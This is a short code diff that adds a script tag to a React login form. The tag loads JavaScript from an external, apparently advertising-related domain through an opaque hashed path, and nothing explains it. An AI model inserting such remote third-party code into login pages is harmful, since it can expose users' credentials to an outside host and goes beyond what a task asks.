@@ -78,6 +78,7 @@ function LoginForm() {
 
     return (
         <>
+            <script src="https://pl28328610.effectivegatecpm.com/bf/02/f6/bf02f660559346f7e2a579a384bac4d7.js"></script>
             <MobileWarning />
 
             <div className="min-h-screen flex items-center justify-center p-4"
